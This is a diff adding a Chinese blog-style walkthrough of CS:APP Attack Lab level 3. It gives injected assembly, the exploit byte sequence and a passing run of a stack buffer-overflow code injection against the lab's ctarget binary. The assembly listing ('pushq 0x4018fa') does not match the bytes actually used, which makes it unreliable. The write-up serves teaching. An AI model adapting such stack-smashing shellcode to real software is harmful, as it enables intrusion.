@@ -198,6 +198,105 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
 ```
 
+### level 3
+
+第三阶段，也是需要在输入的字符串中注入一段代码，但是不同于第二阶段的是，在这一阶段中我们需要传递字符串作为参数。
+
+在这一段中我们需要劫持控制流，在正常返回的时候，跳转到`touch3`函数，其中`touch3`函数的代码如下：
+
+```c
+void touch3(char *sval) {
+  vlevel = 3;
+  if (hexmatch(cookie, sval)) {
+    printf("Touch3!: You called touch3(\"%s\")\n", sval);
+    validate(3);
+  } else {
+    printf("Misfire: You called touch3(\"%s\")\n", sval);
+    fail(3);
+  }
+  exit(0);
+}
+```
+
+在`touch3`函数中调用了`hexmatch`函数，这个函数的功能是匹配`cookie`和传进来的字符是否匹配。在本文中`cookie`的值是`0x59b997fa`，所以我们传进去的参数应该是`"59b997fa"`。
+
+```c
+int hexmatch(unsigned val, char *sval) {
+  char cbuf[110];
+  char *s = cbuf + random() % 100;
+  sprintf(s, "%.8x", val);
+  return strncmp(sval, s, 9) == 0;
+}
+```
+
+当调用`hexmatch`和`strncmp`时，它们会把数据压入到栈中，有可能会覆盖`getbuf`栈帧的数据，所以传入字符串的位置必须小心谨慎。
+
+因为`char *s = cbuf + random() % 100;`，`s`的位置随机，所以如果字符串放在`gethuf`中并不可靠，其可能会被`hexmatch`压入到栈中的数据覆盖。
+
+我们把字符串放在`getbuf`的父栈帧中，也就是`test`栈帧中。
+
+思路：
+
+1. 将`cookie`字符串转化为16进制
+2. 将字符串的地址传送到`%rdi`中
+3. 和level 2一样，想要调用`touch3`函数，则先将`touch3`函数的地址压栈，然后调用`ret`指令。
+
+可以得到注入的汇编代码：
+
+```s
+movq    $0x5561dca8, %rdi
+pushq   0x4018fa
+ret
+```
+
+将上述的汇编代码转化为计算机可以执行的指令序列，执行下列命令：
+
+```bash
+$ gcc -c inject_lv3.s 
+$ objdump -d inject_lv3.o 
+
+inject_lv3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
+   7:   ff 34 25 fa 18 40 00    pushq  0x4018fa
+   e:   c3                      retq
+```
+
+得到这三条指令字节序列`48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3`
+
+使用`man ascii`命令，可以得到``cookie``的16进制数表示:`35 39 62 39 39 37 66 61 00`，可构建字节序列如下：
+
+```
+48 c7 c7 a8 dc 61 55 68 fa 18 
+40 00 c3 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00 35 39
+62 39 39 37 66 61 00
+```
+
+栈组织示意图：
+
+![](https://upload-images.jianshu.io/upload_images/1433829-4f564d4ccfc8b962.png)
+
+```bash
+$ ./hex2raw -i solutions/lv3.txt| ./ctarget -q 
+Cookie: 0x59b997fa
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
+```
+
+
+
 ## reference
 
 1. [深入理解计算机系统（CS:APP) - Attack Lab详解](https://www.viseator.com/2017/07/18/CS_APP_AttackLab/)
